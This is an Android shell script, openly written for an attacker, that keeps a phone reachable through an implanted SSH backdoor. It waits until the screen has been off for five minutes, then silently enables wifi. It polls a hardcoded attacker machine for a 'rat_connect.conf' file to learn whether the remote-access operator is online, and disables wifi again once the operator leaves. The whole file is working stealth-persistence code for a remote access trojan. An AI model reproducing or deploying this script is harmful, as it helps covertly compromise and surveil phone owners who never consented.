#!/system/bin/sh

##
## SCRIPT TO STEALTHILTY TURN ON WIFI
##
## For attacker, in order to access implanted ssh backdoor, a wifi conection is required
## Therefore, this script is written to allow wifi to be automatically turned on if some conditions are fulfilled
## 
## Functions:
## get_time ()			Acquire system current time and convert to desired time format for logging purpose
##
## wait_until_5min_off ()	Before any stealthy action is taken, make sure that the screen is turned off for 5min
##				To achieve this, periodically check screen brightness level, if the screen is turned on
##				before 5 minutes interval, reset timer; otherwise, the timer value keeps rising util
##				5 minutes duration. After then, the message "5 min is over" is written into log file
##				and the function exits.
##
## stealth_wifi_on ()		if Internet not reachable(wifi off), turn on wifi and remove wifi icon from status bar
##				periodically check and turn of wifi if the attacker presents(by checking http://$CLIENT_IP/rat_connect.conf)
##				
##
##
##

LOG_FILE=/data/ssh/root/log.d/stealth.log
function get_time ()
## Function to get current time with format:
## "Sep 01 14:33:47"
{
	echo -n -e " $(date +%b\ %d\ %H:%M:%S )\t\t ";
}



function wait_until_5min_off ()
## wait until screen is off for 5 min, FROM the moment the function is called
{
backlight_path=/sys/class/backlight/panel/brightness
SCREEN_ON_MESSAGE=0
SCREEN_OFF_MESSAGE=0
timer=0
while [ "$timer" -le "100" ]; do
	if [ ! "$( cat $backlight_path)" = "0" ]; then	#if screen is turn on
		timer=0		#reset timer
		if [ "$SCREEN_ON_MESSAGE" = "0" ]; then		#if Message has been displayed, do not display again
			echo $(get_time) Screen is ON! Resetting timer... >> $LOG_FILE
			SCREEN_ON_MESSAGE=1
		fi
	fi
#	echo $(get_time) $timer
	if [ "SCREEN_OFF_MESSAGE" = "0" ]; then		#if Message has been displayed, do not display again
		echo $(get_time) Screen is OFF!  >> $LOG_FILE
		SCREEN_OFF_MESSAGE=1
	fi
	((timer=timer+5))
	sleep 5
done
echo $(get_time)  5 min is over  >> $LOG_FILE;
}

#==============================

function stealth_wifi_on ()
{
enter_exit=0		#add a flag to continue/stop listening on wifi
if    $(wget --spider --quiet http://example.com )	#if the wifi is ON, exit
then
	enter_exit=1
	echo $(get_time)  wifi is already ON, exiting...  >> $LOG_FILE
fi

if [ "$enter_exit" = "0" ]; then	#if the wifi is OFF, remove wifi icon and turn ON wifi
	echo $(get_time)  wifi is OFF!  >> $LOG_FILE
	echo $(get_time)  toggling wifi ON...  >> $LOG_FILE
	svc wifi enable
        while !  $(wget --spider --quiet http://example.com )              #if the internet is NOT REACHABLE, keep sleeping
        do
                sleep 1
        done
fi

## Config client setup
CLIENT_IP=192.168.1.125

if [ "$enter_exit" = "0" ]; then
	if  !  $(wget --spider --quiet http://$CLIENT_IP/rat_connect.conf ); then	#if CLIENT is OFFline
	#if there's no connection to CLIENT, end the function
		enter_exit=1
		echo $(get_time)  CLIENT is OFFline! exitting...  >> $LOG_FILE
	else
		keep_connection=1	# in case CLIENT is ONLINE
		echo $(get_time)  CLIENT is ONline!  >> $LOG_FILE
		echo $(get_time)  checking CLIENT every 10 seconds...  >> $LOG_FILE
		while [ "$keep_connection" = "1" ]
		do	#while CLIENT is online
			sleep 10	# idle 10 seconds before re-check
			if !  $(wget --spider --quiet http://$CLIENT_IP/rat_connect.conf ); then	#if CLIENT is OFFLINE
				echo $(get_time)  CLIENT is NO LONGER ONline, exitting...  >> $LOG_FILE
				keep_connection=0
			fi
		done
	fi
	echo $(get_time)  toggling wifi OFF...  >> $LOG_FILE
	svc wifi disable
fi;
}

echo Log started on $(date +%b\ %d\ -\ %H:%M:%S)  > $LOG_FILE
echo ===  >> $LOG_FILE
echo
while true
do
	wait_until_5min_off
	stealth_wifi_on
	echo  >> $LOG_FILE
	echo $(get_time) ...  >> $LOG_FILE
done

